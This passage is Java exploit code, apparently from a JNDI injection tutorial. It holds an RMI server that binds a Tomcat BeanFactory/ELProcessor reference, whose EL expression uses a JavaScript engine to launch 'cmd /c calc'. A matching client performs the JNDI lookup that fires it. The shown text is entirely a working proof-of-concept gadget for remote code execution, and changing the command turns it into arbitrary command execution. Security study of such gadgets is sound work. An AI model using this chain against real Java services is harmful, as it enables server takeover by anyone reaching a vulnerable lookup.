        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        StringRefAddr sr1 = new StringRefAddr("forceString", "X=eval");
        String el = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")";
        StringRefAddr sr2 = new StringRefAddr("X", el);
        ref.add(sr1);
        ref.add(sr2);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Calc", referenceWrapper);
    }
}
```

```java
package demo03;

import javax.naming.InitialContext;

public class RMIClient {
    public static void main(String[] args) throws Exception {
        String url = "rmi://localhost:1099/Calc";
        InitialContext context = new InitialContext();
        context.lookup(url);
    }
}
```